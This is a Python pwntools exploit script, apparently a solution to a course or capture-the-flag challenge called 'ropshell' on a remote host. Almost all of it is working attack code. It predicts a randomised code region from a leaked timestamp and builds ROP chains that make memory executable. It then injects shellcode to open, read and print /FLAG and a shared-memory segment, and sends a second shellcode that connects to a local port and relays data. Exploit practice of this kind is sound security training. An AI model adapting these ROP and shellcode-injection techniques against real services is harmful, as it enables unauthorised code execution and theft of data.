#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import ctypes
import socket
import sys
import os

def solve_pow(r):
    prefix = r.recvline().decode().split("'")[1]
    print(time.time(), "solving pow ...")
    solved = b''
    for i in range(1000000000):
        h = hashlib.sha1((prefix + str(i)).encode()).hexdigest()
        if h[:6] == '000000':
            solved = str(i).encode()
            print("solved =", solved)
            break;
    print(time.time(), "done.")

    r.sendlineafter(b'string S: ', base64.b64encode(solved))

def get_offset(asm_s, codeint):
    key = asm(asm_s)
    return codeint.index(key)

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    solve_pow(r)

r.recvuntil(b'** Timestamp is ')
timestamp = int(r.recvline().decode().strip())
r.recvuntil(b'** Random bytes generated at ')
baseaddr = int(r.recvline().decode().strip(), 16)

print("{:d} 0x{:016x}".format(timestamp, baseaddr))

LEN_CODE = 10 * 0x10000
libc = ctypes.CDLL('libc.so.6')
libc.srand(timestamp)

basket = []
for i in range(LEN_CODE >> 2):
    b4 = ((libc.rand() << 16) | (libc.rand() & 0xffff)) & (2 ** 32 - 1)
    basket.append(b4)
codeint = bytearray()
for b4 in basket:
    codeint.extend(struct.pack("I", b4))
b4 = libc.rand() % ((LEN_CODE >> 2) - 1)
codeint[b4 * 4: b4 * 4 + 3] = b'\x0f\x05\xc3'

payload = b''
# sys_mprotect(uint64_t start=code, size_t len=LEN_CODE, uint64_t prot=PROT_READ | PROT_WRITE | PROT_EXEC)
payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
payload += p64(10) # %rax=10: call sys_mprotect
payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
payload += p64(baseaddr)
payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
payload += p64(LEN_CODE)
payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
payload += p64(7)
payload += p64(baseaddr + get_offset("syscall\nret", codeint))

dream = bytearray()
dream.extend(asm("pop rax\nret"))
dream.extend(asm("pop rdi\nret"))
dream.extend(asm("pop rsi\nret"))
dream.extend(asm("pop rdx\nret"))
dream.extend(asm("syscall\nret"))
dream.extend(asm("mov rdi, rax\nret"))
dream.extend(asm("mov rsi, rax\nret"))
dream.extend(b'/FLAG\x00')


""" sys_read(uint32_t fd=0, char *buf, size_t count) """
payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
payload += p64(0) # %rax=0: call sys_read
payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
payload += p64(0) # %rdi=fd=1: stdin
payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
payload += p64(baseaddr) # writable buffer address
payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
payload += p64(len(dream)) # read length
payload += p64(baseaddr + get_offset("syscall\nret", codeint))

# note. code section been polluted after read()
codeint2 = codeint.copy()
codeint[:len(dream)] = dream

### visualize the polluted code section
""" sys_write(uint32_t fd=1, char const *buf, size_t count) """
# payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
# payload += p64(1)
# payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
# payload += p64(1) # rdi=fd=1: stdout
# payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
# payload += p64(baseaddr)
# payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
# payload += p64(len(dream))
# payload += p64(baseaddr + get_offset("syscall\nret", codeint))

""" sys_open(const char *filename, int flags, int mode) """
payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
payload += p64(2) # rax=2: call sys_open
payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
payload += p64(baseaddr + codeint.index(b'/FLAG')) # we save "/FLAG" here
payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
payload += p64(0)
payload += p64(baseaddr + get_offset("syscall\nret", codeint))

""" read from '/FLAG' """
# %rdi=%rax: returned fd in %rax
payload += p64(baseaddr + get_offset("mov rdi, rax\nret", codeint))
payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
payload += p64(0) # %rax=0: call sys_read
payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
payload += p64(baseaddr + codeint.index(b'/FLAG'))
payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
payload += p64(0x42) # read length
payload += p64(baseaddr + get_offset("syscall\nret", codeint))

""" write to stdout """
payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
payload += p64(1) # %rax=1: call sys_write
payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
payload += p64(1) # %rdi=fd=1: stdout
payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
payload += p64(baseaddr + codeint.index(b'/FLAG'))
payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
payload += p64(0x42)
payload += p64(baseaddr + get_offset("syscall\nret", codeint))

if 'bin' not in sys.argv[1:]:
    """ sys_shmget(key_t key, size_t size, int shmflg) """
    payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
    payload += p64(29) # %rax=29: call sys_shmget
    payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
    payload += p64(0x1337) # %rdi=key=0x1337
    payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
    payload += p64(4096)
    payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
    payload += p64(0)
    payload += p64(baseaddr + get_offset("syscall\nret", codeint))

    """ sys_shmat(int shmid, char *shmaddr, int shmflg) """
    # %rdi=%rax: returned shm_id in %rax
    payload += p64(baseaddr + get_offset("mov rdi, rax\nret", codeint))
    payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
    payload += p64(30) # %rax=30: call sys_shmat
    payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
    payload += p64(0)
    payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
    payload += p64(4096)
    payload += p64(baseaddr + get_offset("syscall\nret", codeint))

    """ write to stdout """
    # %rsi=%rax: returned char* in %rax
    payload += p64(baseaddr + get_offset("mov rsi, rax\nret", codeint))
    payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
    payload += p64(1) # %rax=1: call sys_write
    payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
    payload += p64(1) # %rdi=fd=1: stdout
    payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
    payload += p64(0x44)
    payload += p64(baseaddr + get_offset("syscall\nret", codeint))

# sys_exit(int error_code=0):
payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
payload += p64(60) # %rax=30: call sys_exit
payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
payload += p64(0)
payload += p64(baseaddr + get_offset("syscall\nret", codeint))

r.sendafter(b'shell> ', payload)
r.send(dream) # send for polluting code section from stdin  

r.recvuntil(b'command received.\n')
flags = r.recvline().decode().strip().split("** ")
for context in flags[0].split('FLAG{'):
    if len(context):
        print("FLAG{" + context)
print(flags[-1])

dream = bytearray()
dream.extend(b'\x00' * 128)
socketaddr = p16(2) + p16(0x1337, endian='big') + socket.inet_aton('127.0.0.1') + b'\x00' * 8
dream.extend(socketaddr)
skipLen = len(dream)
dream.extend(asm(f"""
    mov rax, 0x29
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall

    push rax
    mov rdi, rax
    mov rsi, {baseaddr + 128}
    mov rdx, 0x10
    mov rax, 0x2a
    syscall

    pop rdi
    mov rsi, {baseaddr}
    mov rdx, 128
    mov rax, 0
    syscall

    mov rdx, rax
    mov rdi, 1
    mov rsi, {baseaddr}
    mov rax, 1
    syscall

    mov rdi, 88
    mov rax, 60
    syscall
"""))

codeint = codeint2
payload = b''
payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
payload += p64(10) # %rax=10: call sys_mprotect
payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
payload += p64(baseaddr)
payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
payload += p64(LEN_CODE)
payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
payload += p64(7)
payload += p64(baseaddr + get_offset("syscall\nret", codeint))

payload += p64(baseaddr + get_offset("pop rax\nret", codeint))
payload += p64(0) # %rax=0: call sys_read
payload += p64(baseaddr + get_offset("pop rdi\nret", codeint))
payload += p64(0) # %rdi=fd=1: stdin
payload += p64(baseaddr + get_offset("pop rsi\nret", codeint))
payload += p64(baseaddr) # writable buffer address
payload += p64(baseaddr + get_offset("pop rdx\nret", codeint))
payload += p64(len(dream)) # read length
payload += p64(baseaddr + get_offset("syscall\nret", codeint))

# note. code section been polluted after read()
payload += p64(baseaddr + skipLen)

r.sendafter(b'shell> ', payload)
r.send(dream)

r.recvuntil(b'command received.\n')
print(r.recvline().decode().strip())

r.interactive()
